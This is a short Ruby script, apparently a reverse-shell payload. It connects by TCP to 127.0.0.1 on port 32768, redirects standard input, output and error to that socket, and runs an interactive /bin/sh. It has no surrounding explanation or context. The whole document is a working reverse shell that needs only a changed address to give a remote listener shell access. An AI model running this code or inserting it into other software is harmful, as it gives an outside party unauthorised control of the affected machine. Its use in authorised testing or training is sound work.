require 'socket'
socket = TCPSocket.new('127.0.0.1', 32768)
$stdin.reopen(socket)
$stdout.reopen(socket)
$stderr.reopen(socket)
exec('/bin/sh', '-i')
